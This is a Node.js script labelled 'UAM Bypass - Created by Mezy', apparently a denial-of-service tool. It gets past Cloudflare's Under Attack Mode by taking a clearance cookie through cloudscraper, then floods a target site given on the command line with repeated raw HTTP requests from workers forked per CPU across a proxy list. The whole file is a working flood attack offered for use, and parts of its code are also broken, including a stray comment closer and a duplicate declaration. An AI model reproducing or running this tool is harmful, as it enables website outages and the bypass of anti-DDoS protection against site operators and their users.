const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
    var events = require('events');
    var request = require('request');
    var os = require('os');
    var fs = require('fs');
    var cluster = require('cluster');
    var cloudscraper = require('cloudscraper')
    var url = require('url');
    var path = require('path');
    var net = require('net');
    var chalk = require('chalk');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm i colors');
    execSync('npm i events')
    execSync('npm i os');
    execSync('npm i fs');
    execSync('npm i cluster');
    execSync('npm i cloudscraper');
    execSync('npm i url');
    execSync('npm i path');
    execSync('npm i net');
    execSync('npm i chalk');
    console.log('\x1b[36mDone.\x1b[37m Script is ready.');
    process.exit();
}
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

const {
    fork
} = require('child_process');
var filename = path.basename(__filename);

process.title = "UAM Bypass - Created by Mezy";

if (cluster.isMaster) {
    let cpuCount = require('os').cpus().length;

    let proxy = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n');
    let proxyCount = proxy.length;

    for (let i = 0; i < cpuCount; i += 1) {
        let worker = cluster.fork();
        worker.send({
            id: worker.id,
            proxy: proxy.splice(0, proxyCount / cpuCount)
        });
    }

    cluster.on('exit', function(worker) {
        console.log('Thread %d died ', worker.id);
        cluster.fork();
    });
    
} else {

    let workerId = null;
    let proxy = [];
    const attack = require('./bypasser');
    class Start {

        constructor() {
            this.stats = {
                errors: 0,
                success: 0,
                loop: 0
            };
            this.checkInterval = setInterval(() => {
	    sleep(15)
            console.log(`Thread: ${workerId}`.white.bold + " | " + `errors[${this.stats.success}]`.red.bold + " | " + `success[${this.stats.errors}]`.green.bold + " | " + '\n' + 'cookie: '.rainbow.bold + `[${cookie}]`.green.bold); // errors + success mixed but it's no problem.
            }, 5000);
            this.isRunning = false;

            this.attack = new attack(ua, stats => {
                this.stats.errors += stats.errors;
                this.stats.success += stats.success;
            });
        }

        run(props) {
            this.isRunning = true;

            if (props.method === 'attack')
                for (let i = 0; i < props.threads; i++)
                    this.attack.start(props);
        }

        stop() {
            this.attack.stop();
            clearInterval(this.checkInterval);
        }

    }
    //console.log('UAM Bypass - Created by Mezy'.rainbow.bold);
    if (process.argv.length <= 2) {
    console.log('Usage: node '.green.bold + filename.red.bold + ' http://example.com time'.green.bold);
    process.exit(-1);
	} else {
	console.log('Loading proxy list.'.magenta.bold);
	}
    const start = new Start();

    process.on('message', data => {
        workerId = data.id;
        proxy = data.proxy;
        const victim = {
            site: process.argv[2],
            port: process.argv[3]
        };
        proxy.forEach(async p => {
            let _proxy = p.split(':');
            start.run({
                victim: victim,
                proxy: {
                    host: _proxy[0],
                    time: _proxy[1]
                },
                method: 'attack',
                threads: 8,
                requests: 20
            });
        });
    });
}
let cpuCount = require('os').cpus().length;
var cloudscraper = require('cloudscraper');
console.log('Starting script: '.green.bold + filename.red.bold);
const sleep = (waitTimeInMs) => new Promise(resolve => setTimeout(resolve, waitTimeInMs));
sleep(750).then(() => {
});
if (process.argv.length <= 2) {
    process.exit(-1);
}

const userAgents = fs.readFileSync('useragents.txt', 'utf-8').replace(/\r/g, '').split('\n');
	const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
	"Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
]*/

var site = process.argv[2];
var time = process.argv[3];
var cookie = "";
var ua = "";
var host = url.parse(site).host;
cloudscraper.get(site, function(error, response) {
    if (error) {} else {
        var parsed = JSON.parse(JSON.stringify(response));
        cookie = (parsed["request"]["headers"]["cookie"]);
        if (cookie == undefined) {
            cookie = (parsed["headers"]["set-cookie"]);
        }
        ua = (parsed["request"]["headers"]["User-Agent"]);
    }
    if (cookie) {
    console.log('Successfully recieved cookie'.green.bold)
      } else {
	console.log('Unable to obtain cookie from '.red.bold + site.yellow.bold + '\n');
    console.log('Site not Cloudflare UAM. This script was developed for UAM Cloudflare.'.red.bold)
	process.exit(-1);
	//we will use this another time
	/*var string = "Unable to obtain cookie",
	substring = "Unable";
	process.exit(string.indexOf(substring) !== -1)*/
	}
});
var counter = 0;
var site = site.replace('https', 'http');
var int = setInterval(() => {
    if (cookie !== '' && ua !== '') {
        var s = require('net').Socket();
        s.connect(80, host);
        s.setTimeout(10000);
        for (var i = 0; i < 50; i++) {
            s.write('GET ' + site + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        }
        s.on('data', function() {
            setTimeout(function() {
                s.destroy();
                return delete s;
            }, 5000);
        })
    }
});
setTimeout(() => clearInterval(int), time * 1000);

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});

process.on('uncaughtException', e => {});
process.on('uncaughtRejection', e => {});
process.on('warning', e => {});

